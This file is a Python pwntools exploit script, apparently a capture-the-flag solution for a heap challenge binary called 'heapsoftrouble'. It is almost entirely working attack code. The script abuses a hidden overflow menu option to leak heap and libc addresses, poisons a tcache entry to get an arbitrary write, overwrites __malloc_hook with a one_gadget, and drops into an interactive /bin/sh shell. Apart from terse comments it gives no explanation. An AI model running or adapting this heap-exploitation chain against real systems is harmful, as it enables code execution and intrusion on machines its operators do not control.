#!/usr/bin/env python3
from pwn import *  # NOQA
import os
import sys


context.arch = 'amd64'
# context.log_level = 'debug'

if os.getenv("TMUX"):
    context.terminal = "tmux splitw -h".split()
else:
    context.terminal = "kitty sh -c".split()

debug = "--debug" in sys.argv
is_remote = "--remote" in sys.argv

host = "localhost"
port = 1010
binary_path = "./heapsoftrouble"
libc_path = "./heapsoftrouble.libc"

if is_remote:
    p = remote(host, port)
else:
    p = process(binary_path, env={'LD_PRELOAD': libc_path})

    if debug:
        gdb.attach(p, '''
            c
        ''')

if libc_path:
    libc = ELF(libc_path)

binary = ELF(binary_path)


def login(name):
    r = p.recvuntil("Login: ")
    p.sendline(name)
    r += p.recvuntil("6) Exit\n")
    return r


def createMatrix(name, population):
    p.sendline(b'1')
    r = p.recvuntil("New Matrix: ")
    p.sendline(name)
    r += p.recvuntil("Population to transfer to new matrix: ")
    p.sendline(population)
    r += p.recvuntil("6) Exit\n")
    return r


def deleteMatrix(name):
    p.sendline(b'2')
    r = p.recvuntil('Matrix: ')
    p.sendline(name)
    r += p.recvuntil("6) Exit\n")
    return r


def configureMatrix(name, population):
    p.sendline(b'3')
    r = p.recvuntil('Matrix: ')
    p.sendline(name)
    r += p.recvuntil('New Population: ')
    p.sendline(population)
    r += p.recvuntil("6) Exit\n")
    return r


def showMatrix(name):
    p.sendline(b'4')
    r = p.recvuntil('Matrix: ')
    p.sendline(name)
    r += p.recvuntil("6) Exit\n")
    return r


def showAllMatrixes(name):
    p.sendline(b'5')
    r = p.recvuntil("6) Exit\n")
    return r


def silentOverflow(data):
    p.sendline(b'7')
    p.sendline(data)
    r = p.recvuntil("6) Exit\n")
    return r


def extractHeapChunk(data, offset, length=None):
    length = u64(data[offset - 8:offset]) & (2 ** 32 - 8) if length is None else length
    print(length)
    main_data = data[offset:offset + length]
    fd = u64(data[offset:offset + 8])
    return {'length': length, 'data': main_data, 'fd': fd}


login(b'notNeo')

# Create a chunk in the small bin so that the libc address is on the heap
# Increase name length with blind overwrite
# Use increased name length to leak heap addresses and libc address.
# Use heap leak+overwrite to gain arbitrary write: corrupt a tcache chunk.
# Use libc write to overwrite __malloc_hook with a onegadget

# Create small bin (which will have a libc address in it) by filling up tcache with large enough chunks
# getline will increase size of allocation
deleteMatrix(b'Matrix #1')
for i in range(8):
    createMatrix(b'A' * 0x80, b'1')
    deleteMatrix(b'A' * 0x80)


deleteMatrix(b'Matrix #4')
silentOverflow(b'A')
silentOverflow(b'A\x00' + b'A' * 46 + p64(1234) + p64(12345) + b'\x00\x00')  # use cyclic.find + 'heap bins' write after silentOverflow in gef to see what will overwrite the size. Size becomes '0xa0000'
leak = showMatrix(b'Matrix #5')
heap_dump = leak[0x10:0x0a0010]
chunk = extractHeapChunk(heap_dump, 48)
leaked_addr = chunk['fd']

# Leak libc address
c = extractHeapChunk(heap_dump, 0x780, 16)
libc_base = c['fd'] - 0x1b9a40
print('libc base', hex(libc_base))

# Calculate malloc hook address
libc_malloc_hook = libc.symbols['__malloc_hook'] + libc_base
print('malloc hook', hex(libc_malloc_hook))
targetAddr = libc_malloc_hook - 2  # -2 to deal with the random writing of a null byte by silentOverflow

deleteMatrix("Matrix #7")  # This is where we want to start the overflow from
silentOverflow(b'A\x00' + b'A' * 38 + p64(0x31) + p64(targetAddr))

# Allocate corrupted entry, next alloc will be targetAddr
silentOverflow(b'A')

# Calculate One Gadget Address
# 0xc751d execve("/bin/sh", r13, rdx)
# constraints:
#  [r13] == NULL || r13 == NULL
#  [rdx] == NULL || rdx == NULL
onegadget = libc_base + 0xc751d
print('one gadget', hex(onegadget))
silentOverflow(b'A\x00' + p64(onegadget))
p.sendline('4')  # One of the few ways to call malloc and get the one gadget constaints to work out.

p.interactive()
